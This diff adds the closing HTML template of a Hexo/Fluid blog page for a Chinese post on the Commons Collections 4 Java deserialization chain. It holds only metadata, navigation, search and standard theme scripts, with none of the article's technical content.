+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" class="print-no-link">#安全研究</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CC4反序列化链分析</div>
+      <div>http://example.com/2024/10/15/CC4/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/19/CC2/" title="CC2反序列化链分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CC2反序列化链分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/12/CC3/" title="CC3反序列化链分析">
+                        <span class="hidden-mobile">CC3反序列化链分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
